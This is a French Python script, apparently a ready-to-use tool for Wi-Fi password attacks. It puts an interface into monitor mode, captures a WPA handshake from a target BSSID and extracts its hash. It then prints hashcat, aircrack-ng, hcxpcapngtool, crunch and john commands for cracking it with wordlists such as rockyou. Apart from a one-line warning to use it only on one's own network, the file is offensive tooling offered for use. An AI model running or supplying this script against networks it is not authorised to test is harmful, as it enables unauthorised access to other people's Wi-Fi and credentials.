#!/usr/bin/env python3
"""
Script rapide pour capturer un handshake WiFi et extraire le hash
Usage: sudo python3 quick_wifi_hash.py [BSSID] [CANAL]

Exemple: sudo python3 quick_wifi_hash.py AA:BB:CC:DD:EE:FF 6
"""

import sys
import os
from wifi_scanner import WiFiScanner


def main():
    """Fonction principale"""

    # Vérifier ROOT
    if os.geteuid() != 0:
        print("❌ Ce script nécessite ROOT/SUDO")
        print(f"   Usage: sudo {sys.argv[0]} [BSSID] [CANAL]")
        sys.exit(1)

    # Parser les arguments
    if len(sys.argv) != 3:
        print("Usage: sudo python3 quick_wifi_hash.py [BSSID] [CANAL]")
        print("\nExemple:")
        print("  sudo python3 quick_wifi_hash.py AA:BB:CC:DD:EE:FF 6")
        print("\n💡 Pour scanner les réseaux d'abord, utilisez:")
        print("  sudo python3 test_wifi_scanner.py")
        sys.exit(1)

    target_bssid = sys.argv[1]
    target_channel = int(sys.argv[2])

    print("=" * 60)
    print("CAPTURE RAPIDE DE HANDSHAKE WIFI")
    print("=" * 60)
    print(f"BSSID cible: {target_bssid}")
    print(f"Canal: {target_channel}")
    print("\n⚠️  AVERTISSEMENT: Utilisez uniquement sur vos propres réseaux!")
    print("=" * 60)

    # Créer le scanner
    scanner = WiFiScanner()

    # Vérifier les dépendances
    print("\n[1/5] Vérification des dépendances...")
    requirements = scanner.check_requirements()

    missing = [req for req, available in requirements.items() if not available]
    if missing:
        print(f"❌ Dépendances manquantes: {', '.join(missing)}")

        if not requirements['root_access']:
            print("   → Exécutez avec sudo")
        if not requirements['scapy']:
            print("   → Installez scapy: pip install scapy")
        if not requirements['airmon_ng']:
            print("   → Installez aircrack-ng: sudo apt-get install aircrack-ng")

        sys.exit(1)

    print("✓ Toutes les dépendances sont présentes")

    # Détecter les interfaces WiFi
    print("\n[2/5] Détection des interfaces WiFi...")
    interfaces = scanner.get_wifi_interfaces()

    if not interfaces:
        print("❌ Aucune interface WiFi détectée")
        sys.exit(1)

    print(f"✓ Interfaces détectées: {', '.join(interfaces)}")
    selected_interface = interfaces[0]
    print(f"→ Interface sélectionnée: {selected_interface}")

    # Activer le mode moniteur
    print("\n[3/5] Activation du mode moniteur...")
    mon_interface = scanner.enable_monitor_mode(selected_interface)

    if not mon_interface:
        print("❌ Échec de l'activation du mode moniteur")
        print("\nEssayez manuellement:")
        print(f"  sudo airmon-ng start {selected_interface}")
        sys.exit(1)

    print(f"✓ Mode moniteur activé: {mon_interface}")

    try:
        # Capturer le handshake
        print("\n[4/5] Capture du handshake...")
        print(f"→ Cible: {target_bssid}")
        print(f"→ Canal: {target_channel}")
        print(f"→ Durée: 60 secondes")
        print("\n💡 ASTUCE: Déconnectez/reconnectez un appareil au réseau WiFi")
        print("           pour accélérer la capture du handshake\n")

        output_file = f"/tmp/handshake_{target_bssid.replace(':', '')}.pcap"

        success = scanner.capture_handshake_scapy(
            bssid=target_bssid,
            channel=target_channel,
            interface=mon_interface,
            duration=60,
            output_file=output_file
        )

        if not success:
            print("\n❌ Handshake non capturé")
            print("\nRaisons possibles:")
            print("  - Aucun client connecté au réseau")
            print("  - Aucune reconnexion pendant la capture")
            print("  - BSSID ou canal incorrect")
            print("\nSolutions:")
            print("  - Augmentez la durée de capture (éditez le script)")
            print("  - Déconnectez manuellement un appareil du WiFi")
            print("  - Vérifiez le BSSID et le canal avec:")
            print(f"    sudo airodump-ng {mon_interface}")
            sys.exit(1)

        print(f"\n✓ Handshake capturé avec succès!")
        print(f"→ Fichier PCAP: {output_file}")

        # Extraire le hash
        print("\n[5/5] Extraction du hash...")

        hash_result = scanner.extract_hash_from_pcap(output_file)

        if hash_result:
            print(f"✓ Hash extrait avec succès!")
            print(f"→ Hash: {hash_result}")

            # Instructions pour le cracking
            print("\n" + "=" * 60)
            print("CRACKING DU HASH")
            print("=" * 60)

            if hash_result.endswith('.hc22000'):
                print("\nFormat: Hashcat (recommandé)")
                print(f"\nCommande hashcat:")
                print(f"  hashcat -m 22000 {hash_result} wordlist.txt")
                print(f"\nExemples de wordlists:")
                print(f"  - rockyou.txt (classique)")
                print(f"  - /usr/share/wordlists/rockyou.txt (Kali Linux)")
                print(f"\nOptions utiles:")
                print(f"  --force           : Forcer sur GPU non optimale")
                print(f"  --show            : Afficher les hashs déjà crackés")
                print(f"  -w 3              : Profil de charge (0-4)")
                print(f"  --status          : Afficher le statut pendant le crack")
            else:
                print("\nFormat: PCAP")
                print(f"\nCommande aircrack-ng:")
                print(f"  aircrack-ng -w wordlist.txt {output_file}")
                print(f"\nOu convertir pour hashcat:")
                print(f"  hcxpcapngtool -o hash.hc22000 {output_file}")
                print(f"  hashcat -m 22000 hash.hc22000 wordlist.txt")

            print("\n💡 Génération de wordlist personnalisée:")
            print("  crunch 8 12 -o custom_wordlist.txt  (8-12 caractères)")
            print("  john --wordlist=rockyou.txt --rules --stdout > custom.txt")

            print("\n" + "=" * 60)

        else:
            print("⚠️  Hash non extrait, mais le handshake est dans:")
            print(f"   {output_file}")
            print("\nVous pouvez utiliser directement avec aircrack-ng:")
            print(f"  aircrack-ng -w wordlist.txt {output_file}")

    finally:
        # Désactiver le mode moniteur
        print("\n[NETTOYAGE] Désactivation du mode moniteur...")
        scanner.disable_monitor_mode(mon_interface)
        print("✓ Mode moniteur désactivé")

    print("\n" + "=" * 60)
    print("TERMINÉ")
    print("=" * 60)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n⚠️  Interruption par l'utilisateur")
        print("\nN'oubliez pas de désactiver le mode moniteur:")
        print("  sudo airmon-ng stop wlan0mon")
        print("  sudo systemctl start NetworkManager")
    except Exception as e:
        print(f"\n❌ Erreur: {e}")
        import traceback
        traceback.print_exc()
